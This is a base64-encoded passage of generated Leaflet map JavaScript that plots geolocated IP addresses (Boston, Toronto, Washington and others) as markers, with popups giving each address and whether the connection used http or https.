MCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl82MTU5OWYzZmE1ZmY0MjJlOTcwNDc4ODM0NGFkYWRkNy5zZXRJY29uKGljb25fZTA0NThiNDUxMTgxNDhkNTkwZTZlOGQ4NzUyOWNiYTcpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfMWQwZGQxNGRmMWQyNGI5YjhkN2IzNGQ0ZTRjOTBlNzIgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF83Mjk2YTNhNTFlZWQ0M2ExYWUzZWY0ZDMzZTQ4MDliYyA9ICQoYDxkaXYgaWQ9Imh0bWxfNzI5NmEzYTUxZWVkNDNhMWFlM2VmNGQzM2U0ODA5YmMiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1NYXNzYWNodXNldHRzLCBDaXR5PUJvc3RvbiwgTG9uZ2l0dWRlPS03MS4wNTk4LCBMYXRpdHVkZT00Mi4zNTg0PGJyPjkxLjE4OS45MS4yNjxicj5wcm90b2NvbD1odHRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF8xZDBkZDE0ZGYxZDI0YjliOGQ3YjM0ZDRlNGM5MGU3Mi5zZXRDb250ZW50KGh0bWxfNzI5NmEzYTUxZWVkNDNhMWFlM2VmNGQzM2U0ODA5YmMpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl82MTU5OWYzZmE1ZmY0MjJlOTcwNDc4ODM0NGFkYWRkNy5iaW5kUG9wdXAocG9wdXBfMWQwZGQxNGRmMWQyNGI5YjhkN2IzNGQ0ZTRjOTBlNzIpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzYxNTk5ZjNmYTVmZjQyMmU5NzA0Nzg4MzQ0YWRhZGQ3LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYEJvc3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2QwNjM4Mjk3NjE5ZjRmODJiNGYxZDE2OGMwMGM1ZjJmID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzE3NmViZGQ0MDBkZDQ5NWY4YTdjNTgzOGIzYTM0M2I3ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2QwNjM4Mjk3NjE5ZjRmODJiNGYxZDE2OGMwMGM1ZjJmLnNldEljb24oaWNvbl8xNzZlYmRkNDAwZGQ0OTVmOGE3YzU4MzhiM2EzNDNiNyk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8xNGNlOGM2YzA3NmY0YjQ1OTlhMjdkZGU3OWE2MWRjNCA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2YyM2JlMWViMzJmZDRlYTJhODFlOTJkZWY5NmIyZGRlID0gJChgPGRpdiBpZD0iaHRtbF9mMjNiZTFlYjMyZmQ0ZWEyYTgxZTkyZGVmOTZiMmRkZSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+MTMuNzEuMTcyLjEyODxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfMTRjZThjNmMwNzZmNGI0NTk5YTI3ZGRlNzlhNjFkYzQuc2V0Q29udGVudChodG1sX2YyM2JlMWViMzJmZDRlYTJhODFlOTJkZWY5NmIyZGRlKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfZDA2MzgyOTc2MTlmNGY4MmI0ZjFkMTY4YzAwYzVmMmYuYmluZFBvcHVwKHBvcHVwXzE0Y2U4YzZjMDc2ZjRiNDU5OWEyN2RkZTc5YTYxZGM0KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9kMDYzODI5NzYxOWY0ZjgyYjRmMWQxNjhjMDBjNWYyZi5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfOWY3NzAwYzA1ZWY5NDZjNTkwNmNlYzc2OTMxMWQwYWIgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fNmE4Y2YzY2ZhNGI2NGI2M2IxZDYxN2U2NTM1NjkxNmMgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfOWY3NzAwYzA1ZWY5NDZjNTkwNmNlYzc2OTMxMWQwYWIuc2V0SWNvbihpY29uXzZhOGNmM2NmYTRiNjRiNjNiMWQ2MTdlNjUzNTY5MTZjKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzkzYzgyYWQ1ZmQ0MjRkZTRiNDUzODc2YmUyZmMzZjY2ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfYzEyMGM4ZDgzY2IyNDI4YzljOTlkMWIxOGNiNGMwNzQgPSAkKGA8ZGl2IGlkPSJodG1sX2MxMjBjOGQ4M2NiMjQyOGM5Yzk5ZDFiMThjYjRjMDc0IiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjIzOS4yMjAuMzI8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzkzYzgyYWQ1ZmQ0MjRkZTRiNDUzODc2YmUyZmMzZjY2LnNldENvbnRlbnQoaHRtbF9jMTIwYzhkODNjYjI0MjhjOWM5OWQxYjE4Y2I0YzA3NCk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzlmNzcwMGMwNWVmOTQ2YzU5MDZjZWM3NjkzMTFkMGFiLmJpbmRQb3B1cChwb3B1cF85M2M4MmFkNWZkNDI0ZGU0YjQ1Mzg3NmJlMmZjM2Y2NikKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfOWY3NzAwYzA1ZWY5NDZjNTkwNmNlYzc2OTMxMWQwYWIuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl85ZTljNjQzNTZmNWE0ODc3YjQxMmRkODg4M2U4MmFhYiA9IEwubWFya2VyKAogICAgICAgICAgICBbMzcuNzUxLCAtOTcuODIyXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZGEzNWQ4YTQ4Yjg0NDBhY2E1YWRhYTQ4NWJhNmY2YTQgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfOWU5YzY0MzU2ZjVhNDg3N2I0MTJkZDg4ODNlODJhYWIuc2V0SWNvbihpY29uX2RhMzVkOGE0OGI4NDQwYWNhNWFkYWE0ODViYTZmNmE0KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzVjNDg2MzBkODE5MzQ5MjA4YWIzY2I3OTBlYzc2OTY5ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMTI5NmZjZWI4YzBhNDY2NWEyZGQ1NjM1ZTM5OWIyNDYgPSAkKGA8ZGl2IGlkPSJodG1sXzEyOTZmY2ViOGMwYTQ2NjVhMmRkNTYzNWUzOTliMjQ2IiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgTG9uZ2l0dWRlPS05Ny44MjIsIExhdGl0dWRlPTM3Ljc1MTxicj4yMC4zOC45OC4xNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzVjNDg2MzBkODE5MzQ5MjA4YWIzY2I3OTBlYzc2OTY5LnNldENvbnRlbnQoaHRtbF8xMjk2ZmNlYjhjMGE0NjY1YTJkZDU2MzVlMzk5YjI0Nik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzllOWM2NDM1NmY1YTQ4NzdiNDEyZGQ4ODgzZTgyYWFiLmJpbmRQb3B1cChwb3B1cF81YzQ4NjMwZDgxOTM0OTIwOGFiM2NiNzkwZWM3Njk2OSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfOWU5YzY0MzU2ZjVhNDg3N2I0MTJkZDg4ODNlODJhYWIuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTm9uZSwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl82NzdiYjExNmY1M2Q0NzBkOGI3ZTA0YjgxZWVhNGU3MCA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9hMDcyMzY0ZTU0Yjc0YmVhYWY4YzY3ZDQxZTdlZGExMCA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl82NzdiYjExNmY1M2Q0NzBkOGI3ZTA0YjgxZWVhNGU3MC5zZXRJY29uKGljb25fYTA3MjM2NGU1NGI3NGJlYWFmOGM2N2Q0MWU3ZWRhMTApOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfZmMyYjAxNDA0ZTJlNDNkNThmOGM1NjkwZTdkNzQ2YTggPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8yZWQ2ZDA0NzliZTQ0Mzc4OWE3ODQ3MDRmMTZkNTVlZSA9ICQoYDxkaXYgaWQ9Imh0bWxfMmVkNmQwNDc5YmU0NDM3ODlhNzg0NzA0ZjE2ZDU1ZWUiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMjM5LjIyMC42NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfZmMyYjAxNDA0ZTJlNDNkNThmOGM1NjkwZTdkNzQ2YTguc2V0Q29udGVudChodG1sXzJlZDZkMDQ3OWJlNDQzNzg5YTc4NDcwNGYxNmQ1NWVlKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNjc3YmIxMTZmNTNkNDcwZDhiN2UwNGI4MWVlYTRlNzAuYmluZFBvcHVwKHBvcHVwX2ZjMmIwMTQwNGUyZTQzZDU4ZjhjNTY5MGU3ZDc0NmE4KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl82NzdiYjExNmY1M2Q0NzBkOGI3ZTA0YjgxZWVhNGU3MC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzVhMDAyNjQ3YzFhYzRhYTQ5MGEzODA2MWFlMjQ3MzZlID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2U3MDFkOTZhNDBkYjRmZTI5YjczZTViOGQwYTE4YzYxID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzVhMDAyNjQ3YzFhYzRhYTQ5MGEzODA2MWFlMjQ3MzZlLnNldEljb24oaWNvbl9lNzAxZDk2YTQwZGI0ZmUyOWI3M2U1YjhkMGExOGM2MSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8wNDA2NTg2MmNjNTk0NjQyYTAzNDUzZjIyNTExMmI5OCA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzc4YWI2MTU0YWRmMjQ5ZjI5NTJhMWJiMTQxMDQ1YjYwID0gJChgPGRpdiBpZD0iaHRtbF83OGFiNjE1NGFkZjI0OWYyOTUyYTFiYjE0MTA0NWI2MCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+NDAuODUuMjMyLjY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF8wNDA2NTg2MmNjNTk0NjQyYTAzNDUzZjIyNTExMmI5OC5zZXRDb250ZW50KGh0bWxfNzhhYjYxNTRhZGYyNDlmMjk1MmExYmIxNDEwNDViNjApOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl81YTAwMjY0N2MxYWM0YWE0OTBhMzgwNjFhZTI0NzM2ZS5iaW5kUG9wdXAocG9wdXBfMDQwNjU4NjJjYzU5NDY0MmEwMzQ1M2YyMjUxMTJiOTgpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzVhMDAyNjQ3YzFhYzRhYTQ5MGEzODA2MWFlMjQ3MzZlLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl81MWQxODBiN2U5NWE0NmJhODkwNWExZjQ2NDM0MjZlYiA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl84YmYxZmU3ZDM2ODg0Njc5YmMyNTY5MDljODE1YzY5NSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl81MWQxODBiN2U5NWE0NmJhODkwNWExZjQ2NDM0MjZlYi5zZXRJY29uKGljb25fOGJmMWZlN2QzNjg4NDY3OWJjMjU2OTA5YzgxNWM2OTUpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfZDIwYTYwMTgxMjE5NGFiYjhjNTBkNjdkNTAxMGE2NTAgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8wOGMzZjU0ZGQxYjc0ODM5YmQ4NWRlMWI1MzI0NDdmMiA9ICQoYDxkaXYgaWQ9Imh0bWxfMDhjM2Y1NGRkMWI3NDgzOWJkODVkZTFiNTMyNDQ3ZjIiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUNBLCBDb3VudHJ5TmFtZT1DYW5hZGEsIFN0YXRlPU9udGFyaW8sIENpdHk9VG9yb250bywgTG9uZ2l0dWRlPS03OS40MjA0LCBMYXRpdHVkZT00My42NjU1PGJyPjEzLjcxLjE3Mi4xMzA8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2QyMGE2MDE4MTIxOTRhYmI4YzUwZDY3ZDUwMTBhNjUwLnNldENvbnRlbnQoaHRtbF8wOGMzZjU0ZGQxYjc0ODM5YmQ4NWRlMWI1MzI0NDdmMik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzUxZDE4MGI3ZTk1YTQ2YmE4OTA1YTFmNDY0MzQyNmViLmJpbmRQb3B1cChwb3B1cF9kMjBhNjAxODEyMTk0YWJiOGM1MGQ2N2Q1MDEwYTY1MCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfNTFkMTgwYjdlOTVhNDZiYTg5MDVhMWY0NjQzNDI2ZWIuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzdjYzA5MmNiMTJlMzQzNDQ5YzQ5MDI0ZmIzZTlhZDc0ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2Y1NmZlYzI4OGMzNTQ0ZDY5Y2IxYWY3YmE5ZTBjMzIxID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzdjYzA5MmNiMTJlMzQzNDQ5YzQ5MDI0ZmIzZTlhZDc0LnNldEljb24oaWNvbl9mNTZmZWMyODhjMzU0NGQ2OWNiMWFmN2JhOWUwYzMyMSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF82MzQ3ZTI4OTliYjU0OGU4YjI0YTg0YmExOTk2ZTNhNCA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzM4ZGYzNzRiYjg3NDRiM2U4NmEwYWExZjJlZGU0ODI1ID0gJChgPGRpdiBpZD0iaHRtbF8zOGRmMzc0YmI4NzQ0YjNlODZhMGFhMWYyZWRlNDgyNSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+MTMuNzEuMTcyLjEzMDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfNjM0N2UyODk5YmI1NDhlOGIyNGE4NGJhMTk5NmUzYTQuc2V0Q29udGVudChodG1sXzM4ZGYzNzRiYjg3NDRiM2U4NmEwYWExZjJlZGU0ODI1KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfN2NjMDkyY2IxMmUzNDM0NDljNDkwMjRmYjNlOWFkNzQuYmluZFBvcHVwKHBvcHVwXzYzNDdlMjg5OWJiNTQ4ZThiMjRhODRiYTE5OTZlM2E0KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl83Y2MwOTJjYjEyZTM0MzQ0OWM0OTAyNGZiM2U5YWQ3NC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfZmEzNmJhY2Q1ZDQzNGQ4MTgxZGI5NjAzMjNhZWY1ZGQgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZDE5NTY5MTg0YjYxNDE4YTk